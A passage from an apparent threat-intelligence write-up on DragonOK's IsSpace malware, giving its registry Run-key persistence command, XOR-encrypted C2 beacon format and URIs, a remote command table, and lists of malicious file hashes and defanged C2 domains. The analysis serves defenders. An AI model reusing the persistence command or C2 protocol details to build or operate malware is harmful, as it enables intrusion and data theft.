id="crayon-5f694c78cc275618711335-2"><span class="crayon-v">HKCU</span><span class="crayon-o">:</span><span class="crayon-v">SOFTWARE</span><span class="crayon-sy">\</span><span class="crayon-v">MICROSOFT</span><span class="crayon-sy">\</span><span class="crayon-v">Windows</span><span class="crayon-sy">\</span><span class="crayon-v">CurrentVersion</span><span class="crayon-sy">\</span><span class="crayon-v">Run</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-e">Name </span><span class="crayon-v">Identity</span><span class="crayon-h"> </span><span class="crayon-o">-</span></div><div class="crayon-line" id="crayon-5f694c78cc275618711335-3"><span class="crayon-e">PropertyType </span><span class="crayon-t">String</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">Value</span><span class="crayon-h"> </span><span class="crayon-v">c</span><span class="crayon-o">:</span><span class="crayon-sy">\</span><span class="crayon-v">users</span><span class="crayon-sy">\</span><span class="crayon-e">josh </span><span class="crayon-v">grunzweig</span><span class="crayon-sy">\</span><span class="crayon-v">appdata</span><span class="crayon-sy">\</span><span class="crayon-v">local</span><span class="crayon-sy">\</span><span class="crayon-v">bfsuc</span><span class="crayon-sy">.</span><span class="crayon-v">exe</span><span class="crayon-h"> </span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c78cc275618711335-4"><span class="crayon-o">-</span><span class="crayon-v">force</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0008 seconds] -->
<p>The malware then makes an initial HTTP POST request to the configured C2 server. It will make this request to the ‘/news/Senmsip.asp’ URI. The POST data is XORed against a key of “\x35\x8E\x9D\x7A”, which is consistent with previous versions of IsSpace and NFlog. Decrypted, the POST data reads “01234567890”. The C2 server in turn will respond with the victim’s external IP address.</p>
<p><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/01/Dragon_10.png" rel="wpdevart_lightbox"><img class="alignnone size-full wp-image-23030" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/01/Dragon_10.png" alt="dragon_10" width="975" height="226" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/01/Dragon_10.png 975w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/01/Dragon_10-900x209.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/01/Dragon_10-300x70.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/01/Dragon_10-768x178.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/01/Dragon_10-370x86.png 370w" sizes="(max-width: 975px) 100vw, 975px" /></a></p>
<p><em>Figure 10 Initial IsSpace beacon</em></p>
<p>IsSpace then spawns two threads that will make HTTP requests to the following URIs:</p>
<ul>
<li>/news/Sennw.asp?rsv_info=[MAC_ADDRESS]</li>
<li>/news/Sentire.asp?rsv_info=[MAC_ADDRESS]</li>
</ul>
<p>The ‘Sennw.asp’ POST requests that are made contain collected victim information. They, like other information sent across the network, are encrypted using the previously mentioned 4-byte XOR key. When decrypted, we are provided with information such as the following:</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-5f694c78cc27b313778754" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
60-F8-1D-CC-2F-CF#%#172.16.95.1#%#172.16.95.186#%#WIN-
LJLV2NKIOKP#%#Win7#%#English(US)#%#2016-12-20 
16:27:12#%#Active#%#xp20160628#%#IsAdmins#%#False</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5f694c78cc27b313778754-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f694c78cc27b313778754-2">2</div><div class="crayon-num" data-line="crayon-5f694c78cc27b313778754-3">3</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5f694c78cc27b313778754-1"><span class="crayon-cn">60</span><span class="crayon-o">-</span><span class="crayon-v">F8</span><span class="crayon-o">-</span><span class="crayon-cn">1D</span><span class="crayon-o">-</span><span class="crayon-v">CC</span><span class="crayon-o">-</span><span class="crayon-cn">2F</span><span class="crayon-o">-</span><span class="crayon-v">CF</span><span class="crayon-p">#%#172.16.95.1#%#172.16.95.186#%#WIN-</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694c78cc27b313778754-2"><span class="crayon-v">LJLV2NKIOKP</span><span class="crayon-p">#%#Win7#%#English(US)#%#2016-12-20 </span></div><div class="crayon-line" id="crayon-5f694c78cc27b313778754-3"><span class="crayon-cn">16</span><span class="crayon-o">:</span><span class="crayon-cn">27</span><span class="crayon-o">:</span><span class="crayon-cn">12</span><span class="crayon-p">#%#Active#%#xp20160628#%#IsAdmins#%#False</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0003 seconds] -->
<p>The information, delimited via ‘#%#’, is as follows:</p>
<table>
<tbody>
<tr>
<td width="234"><strong>Value</strong></td>
<td width="234"><strong>Description</strong></td>
</tr>
<tr>
<td width="234">60-F8-1D-CC-2F-CF</td>
<td width="234">MAC address</td>
</tr>
<tr>
<td width="234">172.16.95.1</td>
<td width="234">External IP collected previously</td>
</tr>
<tr>
<td width="234">172.16.95.186</td>
<td width="234">Internal IP address</td>
</tr>
<tr>
<td width="234">WIN-LJLV2NKIOKP</td>
<td width="234">Hostname</td>
</tr>
<tr>
<td width="234">Win7</td>
<td width="234">Windows version</td>
</tr>
<tr>
<td width="234">English(US)</td>
<td width="234">Language</td>
</tr>
<tr>
<td width="234">2016-12-20 16:27:12</td>
<td width="234">Timestamp</td>
</tr>
<tr>
<td width="234">Active</td>
<td width="234">Malware status. May also be ‘Sleep’</td>
</tr>
<tr>
<td width="234">xp20160628</td>
<td width="234">Potential campaign identifier</td>
</tr>
<tr>
<td width="234">IsAdmins / False</td>
<td width="234">User admin status</td>
</tr>
</tbody>
</table>
<p>The malware is expected to return one of the following two responses to this HTTP request:</p>
<ul>
<li>Active</li>
<li>Slient (Note the typo)</li>
</ul>
<p>In the event the response of Slient is received, the malware will stop sending out HTTP requests to the ‘Sentire.asp’ URI. Conversely, if the malware is set to the ‘Sleep’ status and the ‘Active’ response is received, it will begin the ‘Sentire.asp’ requests once more.</p>
<p>The requests to ‘Sentire.asp’ act as the main C2 loop, requesting commands from the remote server. The commands are consistent with previously observed instances of IsSpace, however, the URIs have been modified.</p>
<table>
<tbody>
<tr>
<td width="156"><strong>Command</strong></td>
<td width="156"><strong>Description</strong></td>
<td width="156"><strong>Response URI</strong></td>
</tr>
<tr>
<td width="156">CMD</td>
<td width="156">Executes command</td>
<td width="156">Sentrl.asp</td>
</tr>
<tr>
<td width="156">Browse</td>
<td width="156">List specified directory</td>
<td width="156">Senjb.asp</td>
</tr>
<tr>
<td width="156">UploadFile</td>
<td width="156">Upload file</td>
<td width="156">Sensp.asp</td>
</tr>
<tr>
<td width="156">DownLoad</td>
<td width="156">Download file</td>
<td width="156">Senwhr.asp</td>
</tr>
<tr>
<td width="156">DelFile</td>
<td width="156">Delete file</td>
<td width="156">N/A</td>
</tr>
</tbody>
</table>
<h3>DragonOK Indicators</h3>
<p><strong>Malicious RTF Documents</strong></p>
<p>020f5692b9989080b328833260e31df7aa4d58c138384262b9d7fb6d221e3673<br />
0d389a7b7dbdfdffcc9b503d0eaf3699f94d7a3135e46c65a4fa0f79ea263b40<br />
52985c6369571793bc547fc9443a96166e372d0960267df298221cd841b69545<br />
785398fedd12935e0ae5ac9c1d188f4868b2dc19fb4c2a13dab0887b8b3e220d<br />
941bcf18f7e841ea35778c971fc968317bee09f93ed314ce40815356a303a3ec<br />
ba6f3581c5bcdbe7f23de2d8034aaf2f6dc0e67ff2cfe6e53cfb4d2007547b30<br />
df9f33892e476458c74a571a9541aebe8f8d18b16278f594a6723f813a147552<br />
925880cc833228999ea06bd37dd2073784ab234ea00c5c4d55f130fe43a0940b<br />
3e4937d06ac86078f96f07117861c734a5fdb5ea307fe7e19ef6458f91c14264<br />
16204cec5731f64be03ea766b75b8997aad14d4eb61b7248aa35fa6b1873398b<br />
64f22de7a1e2726a2c649de133fad2c6ad089236db1006ce3d247c39ee40f578<br />
c3b5503a0a89fd2eae9a77ff92eef69f08d68b963140b0a31721bb4960545e07<br />
d227cf53b29bf0a286e9c4a1e84a7d70b63a3c0ea81a6483fdfabd8fbccd5206<br />
9190b1d3383c68bd0153c926e0ff3716b714eac81f6d125254054b277e3451fe<br />
d321c8005be96a13affeb997b881eaba3e70167a7f0aa5d68eeb4d84520cca02<br />
d38de4250761cb877dfec40344c1642542ca41331af50fa914a9597f8cc0ee9b<br />
5a94e5736ead7ea46dbc95f11a3ca10ae86c8ae381d813975d71feddf14fc07a<br />
bbdc9f02e7844817def006b9bdef1698412efb6e66346454307681134046e595</p>
<p><strong>IsSpace </strong></p>
<p>12d88fbd4960b7caf8d1a4b96868138e67db40d8642a4c21c0279066aae2f429<br />
1a6e3cd2394814a72cdf8db55bc3f781f7e1335b31f77bffc1336f0d11cf23d1</p>
<p><strong>C2 Domains</strong></p>
<p>www.dppline[.]org<br />
www.matrens[.]top</p>
<p><strong>C2 Domains</strong></p>
<p>europe.wikaba[.]com<br />
russiaboy.ssl443[.]org<br />
cool.skywave[.]top</p>
<p><strong>Sysget Version 2 </strong></p>
<p>82f028e147471e6f8c8d283dbfaba3f5629eda458d818e1a4ddb8c9337fc0118</p>
<p><strong>C2 Domains</strong></p>
<p>newtw2016.kr44.78host[.]com</p>
<p><strong>Sysget Version 3</strong></p>
<p>02fc713c1b2c607dff4fc6c4797b39e42ee576578f6af97295495b9b172158b9<br />
a0b0a49da119d971fa3cf2f5647ccc9fe7e1ff989ac31dfb4543f0cb269ed105<br />
b49cb2c51bc2cc5e48585b9b0f7dd7ff2599a086a4219708b102890ab3f4daf3<br />
b8f9c1766ccd4557383b6643b060c15545e5f657d87d82310ed1989679dcfac4<br />
d75433833a3a4453fe35aaf57d8699d90d9c4a933a8457f8cc37c86859f62d1e<br />
685076708ace9fda65845e4cbb673fdd6f11488bf0f6fd5216a18d9eaaea1bbc<br />
7fcc86ebca81deab264418f7ae5017a6f79967ccebe8bc866efa14920e4fd909<br />
c5c3e8caffd1d416c1fd8947e60662d82638a3508dbcf95a6c9a2571263bdcef</p>
<p><strong>C2 Domains</strong></p>
<p>gtoimage[.]com<br />
trend.gogolekr[.]com</p>
<h3>Additional Indicators</h3>
<p><strong>Sysget Version 2 </strong></p>
<p>a768d63f8127a8f87ff7fa8a7e4ca1f7e7a88649fe268cf1bd306be9d8069564<br />
2bf737f147e761586df1c421584dba350fd865cb14113eee084f9d673a61ee67<br />
2c7c9fd09a0a783badfb42a491ccec159207ee7f65444088ba8e7c8e617ab5a5<br />
d91439c8faa0c42162ea9a6d3c282d0e76641a31f5f2fbc58315df9c0b90059c<br />
89d8d52c09dc09aeb41b1e9fafeacf1c038912d8c6b75ad4ef556707b15641ff<br />
6c1d56cb16f6342e01f4ebfc063db2244aef16d0a248332348dcdb31244d32f2<br />
9c66232061fbb08088a3b680b4d0bffbbce1ce01d0ce5f0c4d8bf17f42d45682<br />
b138ea2e9b78568ebd9d71c1eb0e31f9cf8bc41cd5919f6522ef498ffcc8762a<br />
8830400c6a6d956309ac9bcbcceee2d27ba8c89f9d89f4484aba7d5680791459<br />
bda66f13202cef8cfb23f36ac0aee5c23f82930e1f38e81ba807f5c4e46128e3<br />
e8197e711018afd25a32dc364a9155c7e2a0c98b3924dc5f67b8cd2df16406ff<br />
e9c0838e2433a86bc2dec56378bd59627d6332ffb1aec252f5117938d00d9f74<br />
c63685b2497e384885e4b4649428d665692e8e6981dad688e8543110174f853b<br />
2c9c2bfea64dd95495703fcec59ad4cf74c43056b40ed96d40db9b919cfd050b<br />
94850525ea9467ae772c657c3b8c72663eaa28b2c995b22a12b09e4cacecad6d<br />
e8bd20e3d8491497ca2d6878b41fb7be67abb97ee272ef8b6735faa6acd67777</p>
<p><strong>C2 Domains</strong></p>
<p>hello.newtaiwan[.]top<br />
bullskingdom[.]com<br />
mail.googleusa[.]top<br />
www.modelinfos[.]com<br />
modelinfos[.]com<br />
www.sanspozone[.]com</p>
<p><strong>Sysget Version 3</strong></p>
<p>f9a1607cdcfd83555d2b3f4f539d3dc301d307e462a999484d7adb1f1eb9edf6<br />
7f286fbc39746aa8feeefc88006bedd83a3176d2235e381354c3ea24fe33d21c<br />
3b554ef43d9f3e70ead605ed38b5e66c0b8c0b9fc8df16997defa8e52824a2a6<br />
8d7406f4d5759574416b8e443dd9d9cd6e24b5e39b1f5bc679e4a1ad54d409c6<br />
edf32cb7aad7ae6f545f7d9f11e14a8899ab0ac51b224ed36cfc0d367daf5785<br />
db19b9062063302d938bae51fe332f49134dc2e1947d980c82e778e9d7ca0616<br />
cde217acb6cfe20948b37b16769164c5f384452e802759eaabcfa1946ea9e18b<br />
9bee4f8674ee067159675f66ca8d940282b55fd1f71b8bc2aa32795fd55cd17e<br />
39539eb972de4e5fe525b3226f679c94476dfc88b2032c70e5d7b66058619075<br />
c45145ca9af7f21fff95c52726ff82595c9845b8e9d0dbf93ffe98b7a6fa8ee9<br />
55325e9fccbdada83279e915e5aeb60d7b117f154fa2c3a38ec686d2552b1ebc<br />
2c7d29da1b5468b49a4aef31eee6757dc5c3627bf2fbfb8e01dec12aed34736a<br />
16dc75cf16d582eac6cbbe67b048a31fffa2fb525a76c5794dad7d751793c410<br />
91eee738f99174461b9a4085ea70ddafc0997790e7e5d6d07704dcbbc72dc8bf<br />
4a702ffbf01913cc3981d9802c075160dfd1beed3ba0681153d17623f781f53f<br />
e8bed52c58759e715d2a00bdb8a69e7e93def8d4f83d95986da21a549f4d51c5<br />
ed5598716de2129915f427065f0a22f425f4087584e1fa176c6de6ad141889d1<br />
adc86af1c03081482fe9ba9d8a8ae875d7217433164d54e40603e422451a2b90<br />
f0540148768247ed001f3894cdfa52d8e40b17d38df0f97e040a49baa3f5c92e<br />
ce38a6e4f15b9986474c5d7c8a6e8b0826330f0135e1da087aae9eab60ea667a<br />
5c4e98922e6981cf2a801674d7e79a573ebcdc9ebc875ef929511f585b9c4781<br />
4880b43ddc8466d910b7b49b6779970c38ce095983cad110fa924b41f249f898<br />
76b6f0359a3380943fece13033b79dc586706b8348a270ac71b589a5fd5790a4<br />
feab16570c11ec713cfa952457502c7edd21643129c846609cb13cdc0ae4671c<br />
ed9ca7c06aac7525da5af3d1806b32eeb1c1d8f14cc31382ca52a14ed62f00a9<br />
a3aa4b3b3471b0bb5b2f61cbc8a94edef4988436e0bc55e9503173c836fb57a3<br />
29ee56ca66187ece41c1525ad27969a4b850a45815057a31acee7cc76e970909<br />
65201380443210518621da9feb45756eac31213a21a81583cc158f8f65d50626<br />
cccb906d06aef1e33d12b8b09c233e575482228d40ac17232acad2557da4e53b</p>
<p><strong>C2 Domains</strong></p>
<p>gtoimage[.]com<br />
trend.gogolekr[.com<br />
www.bestfiles[.]top</p>
<p><strong>Sysget Version 4</strong></p>
<p>2ac8bc678e5fa3e87d34aee06d2cd56ab8e0ed04cd236cc9d4c5e0fa6d303fa3<br />
8dc539e3d37ccd522c594dc7378c32e5b9deeffb37e7a7a5e9a96b9a23df398e</p>
<p><strong>C2 Domains</strong></p>
<p>www.sanseitime[.]com</p>
<p><strong> </strong></p>
          <div class="article__subscribe mb-40 text-gray-400 bg-gray-200 rounded-lg">
  <h4 class="h3 mb-10 text-black">Get updates from <br class="d-sm-none"> Palo Alto<br class="d-sm-none"> Networks!</h4>
  <p>Sign up to receive the latest news, cyber threat intelligence and research from us</p>
  <!-- <form action="https://app-guse4001.marketo.com/index.php/leadCapture/save2" method="post" novalidate class="subscribe-form py-25" name="Unit42_Subscribe"> -->
  <form action="https://start.paloaltonetworks.com/index.php/leadCapture/save2" method="post" novalidate class="subscribe-form py-25" name="Unit42_Subscribe">
    <input type="hidden" value="1086" name="formid">
    <!-- <input type="hidden" value="818-CZC-273" name="munchkinId"> -->
    <input type="hidden" value="531-OCS-018" name="munchkinId">
    <input type="hidden" value="2141" name="lpId">
    <input type="hidden" value="1086" name="formVid">
    <input type="hidden" name="mkto_optinunit42" value="true">
    <input type="hidden" name="mkto_opt-in" value="true">
    <div class="row">
      <div class="col-sm col-12 mb-sm-0 mb-15">
        <input type="email" name="Email" placeholder="Email address" class="subscribe-field d-block w-100 px-sm-25 px-15 bg-white">
        <p class="error-mail d-none mt-15 text-danger" style="color: #dc3545">Please enter your email address!</p>
      </div>
      <div class="col-sm-auto col-12">
          <input type="submit" value="Subscribe" class="btn btn--black btn--sm w-100" disabled="disabled">
      </div>
    </div>

    <div class="google-recapth mt-15">
      <div class="g-recaptcha" data-expired-callback="captchaExpires" data-callback="captchaComplete" data-sitekey="6LfKOrwUAAAAAOwgjxrEcx-pcfwe8OquUw6ommTK"></div>
      <p class="error-recaptcha d-none mt-15 text-danger" style="color: #dc3545">Please mark, I'm not a robot!</p>
    </div>
  </form>

  <div class="font-size-ex-sm col-sm-7 p-0">
    <p>By submitting this form, you agree to our <a href="https://www.paloaltonetworks.com/legal-notices/terms-of-use">Terms of Use</a> and acknowledge our <a href="https://www.paloaltonetworks.com/legal-notices/privacy">Privacy Statement</a>.</p>
  </div>
</div>

<script type="text/javascript" src="https://researchcenter.paloaltonetworks.com/wp-content/plugins/google-analyticator/external-tracking.min.js?ver=6.4.9"></script>
        </div>
      </div>
    </div>
  </article>
<footer class="site-footer px-sm-0 px-15">
  <div class="pt-40">
    <div class="container pt-sm-30">
      <div class="row justify-content-lg-center">
        <div class="col-lg-11 col-12">
          <div class="row">
            <div class="col-lg-4 col-sm-3 col-12 order-sm-2">
              <nav class="footer-socials mb-sm-0 mb-25 text-white text-sm-right">
                                                <a href="https://twitter.com/Unit42_Intel" target="_blank"><span class="ui ui-4"></span></a>
                <a href="https://github.com/pan-unit42" target="_blank"><span class="ui ui-5"></span></a>
              </nav>
            </div>

            <div class="col-lg-8 col-sm-9 col-12 order-sm-1">
              <div class="row">
                <div class="col-sm col-12 footer-widget widget_nav_menu"><h4 class="h6 mb-15 font-weight-black">Popular Resources</h4><div class="menu-footer-company-phase-container"><ul id="menu-footer-company-phase" class="menu"><li id="menu-item-97096" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97096"><a target="_blank" href="https://www.paloaltonetworks.com/resources">Resource Center</a></li>
<li id="menu-item-97097" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97097"><a target="_blank" href="https://researchcenter.paloaltonetworks.com/">Blog</a></li>
<li id="menu-item-97098" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97098"><a target="_blank" href="https://www.paloaltonetworks.com/communities">Communities</a></li>
<li id="menu-item-97099" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97099"><a target="_blank" href="https://docs.paloaltonetworks.com/">Tech Docs</a></li>
<li id="menu-item-97100" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-97100"><a href="https://unit42.paloaltonetworks.com/">Unit 42</a></li>
<li id="menu-item-97101" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97101"><a target="_blank" href="https://www.paloaltonetworks.com/sitemap">Sitemap</a></li>
</ul></div></div><div class="col-sm col-12 footer-widget widget_nav_menu"><h4 class="h6 mb-15 font-weight-black">Legal Notices</h4><div class="menu-footer-legal-notices-phase-container"><ul id="menu-footer-legal-notices-phase" class="menu"><li id="menu-item-97093" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97093"><a target="_blank" href="https://www.paloaltonetworks.com/legal-notices/privacy">Privacy</a></li>
<li id="menu-item-97094" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97094"><a target="_blank" href="https://www.paloaltonetworks.com/legal-notices/terms-of-use">Terms of Use</a></li>
<li id="menu-item-97095" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97095"><a target="_blank" href="https://www.paloaltonetworks.com/legal">Documents</a></li>
</ul></div></div><div class="col-sm col-12 footer-widget widget_nav_menu"><h4 class="h6 mb-15 font-weight-black">Account</h4><div class="menu-footer-trending-topics-phase-container"><ul id="menu-footer-trending-topics-phase" class="menu"><li id="menu-item-97102" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97102"><a href="https://start.paloaltonetworks.com/preference-center">Manage Subscriptions</a></li>
<li id="menu-item-97103" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97103"><a href="#">&nbsp;</a></li>
<li id="menu-item-97104" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97104"><a href="https://www.paloaltonetworks.com/security-disclosure">Report a Vulnerability</a></li>
</ul></div></div>              </div>
            </div>
          </div>

          
            <div class="copyrights py-25 mt-40">
               <p>© 2020 Palo Alto Networks, Inc. All rights reserved.</p>
            </div>
          
        </div>
      </div>
    </div>
  </div>
</footer>
    <script type="text/javascript">
	var isProcessing = false; 
    function alter_ul_post_values(obj,post_id,ul_type){
	
		if (isProcessing)    
		return;  
		isProcessing = true;   
		
		jQuery(obj).find("span").html("..");
                jQuery.ajax({
                    type: "POST",
                    url: "https://unit42.paloaltonetworks.com/wp-content/plugins/like-dislike-counter-for-posts-pages-and-comments/ajax_counter.php",
                    data: "post_id="+post_id+"&up_type="+ul_type,
                    success: function(msg){
                            jQuery(obj).find("span").html(msg);
                            isProcessing = false; 
                            jQuery(obj).find('svg').children('path').attr('stroke','#0050FF');
                            jQuery(obj).removeClass('idc_ul_cont_not_liked idc_ul_cont_not_liked_inner');
                    }
 		});
	}
	</script>
            <script type="text/javascript">
            (function(){
                document.addEventListener('DOMContentLoaded', function(){
                    let wpp_widgets = document.querySelectorAll('.popular-posts-sr');

                    if ( wpp_widgets ) {
                        for (let i = 0; i < wpp_widgets.length; i++) {
                            let wpp_widget = wpp_widgets[i];
                            WordPressPopularPosts.theme(wpp_widget);
                        }
                    }
                });
            })();
        </script>
                <script>
            var WPPImageObserver = null;

            function wpp_load_img(img) {
                if ( ! 'imgSrc' in img.dataset || ! img.dataset.imgSrc )
                    return;

                img.src = img.dataset.imgSrc;

                if ( 'imgSrcset' in img.dataset ) {
                    img.srcset = img.dataset.imgSrcset;
                    img.removeAttribute('data-img-srcset');
                }

                img.classList.remove('wpp-lazyload');
                img.removeAttribute('data-img-src');
                img.classList.add('wpp-lazyloaded');
            }

            function wpp_observe_imgs(){
                let wpp_images = document.querySelectorAll('img.wpp-lazyload'),
                    wpp_widgets = document.querySelectorAll('.popular-posts-sr');

                if ( wpp_images.length || wpp_widgets.length ) {
                    if ( 'IntersectionObserver' in window ) {
                        WPPImageObserver = new IntersectionObserver(function(entries, observer) {
                            entries.forEach(function(entry) {
                                if (entry.isIntersecting) {
                                    let img = entry.target;
                                    wpp_load_img(img);
                                    WPPImageObserver.unobserve(img);
                                }
                            });
                        });

                        if ( wpp_images.length ) {
                            wpp_images.forEach(function(image) {
                                WPPImageObserver.observe(image);
                            });
                        }

                        if ( wpp_widgets.length ) {
                            for (var i = 0; i < wpp_widgets.length; i++) {
                                let wpp_widget_images = wpp_widgets[i].querySelectorAll('img.wpp-lazyload');

                                if ( ! wpp_widget_images.length && wpp_widgets[i].shadowRoot ) {
                                    wpp_widget_images = wpp_widgets[i].shadowRoot.querySelectorAll('img.wpp-lazyload');
                                }

                                if ( wpp_widget_images.length ) {
                                    wpp_widget_images.forEach(function(image) {
                                        WPPImageObserver.observe(image);
                                    });
                                }
                            }
                        }
                    } /** Fallback for older browsers */
                    else {
                        if ( wpp_images.length ) {
                            for (var i = 0; i < wpp_images.length; i++) {
                                wpp_load_img(wpp_images[i]);
                                wpp_images[i].classList.remove('wpp-lazyloaded');
                            }
                        }

                        if ( wpp_widgets.length ) {
                            for (var j = 0; j < wpp_widgets.length; j++) {
                                let wpp_widget = wpp_widgets[j],
                                    wpp_widget_images = wpp_widget.querySelectorAll('img.wpp-lazyload');

                                if ( ! wpp_widget_images.length && wpp_widget.shadowRoot ) {
                                    wpp_widget_images = wpp_widget.shadowRoot.querySelectorAll('img.wpp-lazyload');
                                }

                                if ( wpp_widget_images.length ) {
                                    for (var k = 0; k < wpp_widget_images.length; k++) {
                                        wpp_load_img(wpp_widget_images[k]);
                                        wpp_widget_images[k].classList.remove('wpp-lazyloaded');
                                    }
                                }
                            }
                        }
                    }
                }
            }

            document.addEventListener('DOMContentLoaded', function() {
                wpp_observe_imgs();

                // When an ajaxified WPP widget loads,
                // Lazy load its images
                document.addEventListener('wpp-onload', function(){
                    wpp_observe_imgs();
                });
            });
        </script>
        <link rel='stylesheet' id='wpdevart_lightbox_front_end_css-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/lightbox-popup/includes/style/wpdevart_lightbox_front.css?ver=5.4.1' type='text/css' media='all' />
<link rel='stylesheet' id='wpdevart_lightbox_effects-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/lightbox-popup/includes/style/effects_lightbox.css?ver=5.4.1' type='text/css' media='all' />
<script type='text/javascript' src='https://www.google.com/recaptcha/api.js'></script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/dist/scripts/main.js'></script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-includes/js/wp-embed.min.js?ver=5.4.1'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var wpdevart_lb_variables = {"eneble_lightbox_content":"enable","overlay_transparency_prancent":"80","popup_background_color":"#000000","popup_loading_image":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/popup_loading.png","popup_initial_width":"350","popup_initial_height":"300","popup_youtube_width":"640","popup_youtube_height":"410","popup_vimeo_width":"500","popup_vimeo_height":"410","popup_max_width":"5000","popup_max_height":"5000","popup_position":"5","popup_fixed_position":"true","popup_outside_margin":"0","popup_border_width":"2","popup_border_color":"#000000","popup_border_radius":"10","control_buttons_show":"true","control_buttons_show_in_content":"false","control_buttons_height":"30","control_buttons_line_bg_color":"#000000","control_button_prev_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/prev.png","control_button_prev_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/prev_hover.png","control_button_next_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/next.png","control_button_next_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/next_hover.png","control_button_download_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/download.png","control_button_download_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/download_hover.png","control_button_innewwindow_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/innewwindow.png","control_button_innewwindow_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/innewwindow_hover.png","control_button_fullwidth_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/fullwidth.png","control_button_fullwidht_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/fullwidth_hover.png","control_button_fullwidthrest_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/fullwidthreset.png","control_button_fullwidhtrest_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/fullwidthreset_hover.png","control_button_close_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/close.png","control_button_close_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/close_hover.png","information_panel_show":"false","information_panel_show_in_content":"false","information_panel_bg_color":"#000000","information_panel_default_transparency":"100","information_panel_hover_trancparency":"100","information_panel_count_image_after_text":"Image","information_panel_count_image_middle_text":"of","information_panel_count_padding_left":"15","information_panel_count_padding_right":"4","information_panel_count_font_size":"20",